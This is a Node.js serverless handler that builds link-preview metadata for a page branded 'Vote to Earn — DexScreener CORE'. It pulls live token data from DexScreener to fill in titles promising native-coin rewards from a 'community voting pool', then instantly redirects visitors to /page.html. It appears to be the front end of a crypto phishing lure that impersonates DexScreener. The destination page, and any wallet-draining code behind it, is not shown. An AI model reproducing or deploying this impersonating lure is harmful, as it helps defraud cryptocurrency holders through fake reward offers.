var https = require('https');

function httpGet(url) {
    return new Promise(function (resolve, reject) {
        https.get(url, function (r) {
            if (r.statusCode >= 300 && r.statusCode < 400 && r.headers.location) {
                return httpGet(r.headers.location).then(resolve).catch(reject);
            }
            var d = '';
            r.on('data', function (c) { d += c; });
            r.on('end', function () { resolve(d); });
        }).on('error', reject).setTimeout(5000, function () {
            this.destroy();
            reject(new Error('timeout'));
        });
    });
}

function e(s) {
    return String(s || '')
        .replace(/&/g, '&amp;')
        .replace(/"/g, '&quot;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

module.exports = async function (req, res) {
    var ca = (req.query.ca || req.query.token || '').trim();
    var host = req.headers.host || '';
    var fullUrl = 'https://' + host + '/?ca=' + encodeURIComponent(ca);
    var redirect = '/page.html' + (ca ? '?ca=' + encodeURIComponent(ca) : '');

    var title = 'Vote to Earn \u2014 DexScreener CORE';
    var desc = '\uD83D\uDDF3 Vote and earn rewards from the community voting pool';

    // OG IMAGE: points to our dynamic image generator
    var img = 'https://' + host + '/api/og?ca=' + encodeURIComponent(ca);

    if (ca.length > 10) {
        try {
            var body = await httpGet(
                'https://api.dexscreener.com/latest/dex/tokens/' + encodeURIComponent(ca)
            );
            var data = JSON.parse(body);

            if (data.pairs && data.pairs.length > 0) {
                data.pairs.sort(function (a, b) {
                    return ((b.liquidity && b.liquidity.usd) || 0) -
                           ((a.liquidity && a.liquidity.usd) || 0);
                });

                var p = data.pairs[0];
                var tk = p.baseToken || {};
                var ch = p.chainId || 'unknown';
                var mc = p.fdv || p.marketCap || 0;

                var rewards = {
                    solana: 'SOL', ethereum: 'ETH', bsc: 'BNB', base: 'ETH',
                    arbitrum: 'ETH', polygon: 'MATIC', avalanche: 'AVAX',
                    optimism: 'ETH', fantom: 'FTM', sui: 'SUI', ton: 'TON',
                    cronos: 'CRO', sei: 'SEI', near: 'NEAR'
                };
                var cs = rewards[ch] || ch.toUpperCase();
                var nm = tk.name || tk.symbol || 'Token';
                var sy = tk.symbol || tk.name || '???';

                var ms;
                if (mc >= 1e9) ms = '$' + (mc / 1e9).toFixed(1) + 'B';
                else if (mc >= 1e6) ms = '$' + (mc / 1e6).toFixed(1) + 'M';
                else if (mc >= 1e3) ms = '$' + (mc / 1e3).toFixed(1) + 'K';
                else ms = '$' + Math.round(mc || 0);

                title = nm + ' \u2014 Vote to Earn ' + cs;
                desc = '\uD83D\uDDF3 Vote for ' + sy + ' \u00B7 ' + ms + ' mcap \u00B7 Earn ' + cs + ' rewards from the community voting pool';
            }
        } catch (err) {
            console.error('API error:', err.message);
        }
    }

    var html = '<!DOCTYPE html>\n'
        + '<html lang="en"><head>\n'
        + '<meta charset="UTF-8">\n'
        + '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n'
        + '<title>' + e(title) + '</title>\n'
        + '<meta name="description" content="' + e(desc) + '">\n'
        + '<meta property="og:type" content="website">\n'
        + '<meta property="og:site_name" content="DexScreener CORE">\n'
        + '<meta property="og:title" content="' + e(title) + '">\n'
        + '<meta property="og:description" content="' + e(desc) + '">\n'
        + '<meta property="og:url" content="' + e(fullUrl) + '">\n'
        + '<meta property="og:image" content="' + e(img) + '">\n'
        + '<meta property="og:image:width" content="1200">\n'
        + '<meta property="og:image:height" content="630">\n'
        + '<meta name="twitter:card" content="summary_large_image">\n'
        + '<meta name="twitter:title" content="' + e(title) + '">\n'
        + '<meta name="twitter:description" content="' + e(desc) + '">\n'
        + '<meta name="twitter:image" content="' + e(img) + '">\n'
        + '<style>body{margin:0;background:#020203;display:flex;align-items:center;'
        + 'justify-content:center;height:100vh;flex-direction:column;font-family:sans-serif}'
        + '.s{width:50px;height:50px;border:3px solid rgba(34,197,94,.1);'
        + 'border-top-color:#22c55e;border-radius:50%;animation:r 1s linear infinite}'
        + '@keyframes r{to{transform:rotate(360deg)}}'
        + '.t{margin-top:16px;color:#555;font-size:13px;font-weight:600;letter-spacing:1px}</style>\n'
        + '</head><body>\n'
        + '<div class="s"></div><div class="t">LOADING</div>\n'
        + '<script>window.location.replace("' + redirect + '");</' + 'script>\n'
        + '<noscript><meta http-equiv="refresh" content="0;url=' + redirect + '"></noscript>\n'
        + '</body></html>';

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Cache-Control', 'public, s-maxage=300, max-age=60');
    return res.status(200).send(html);
};
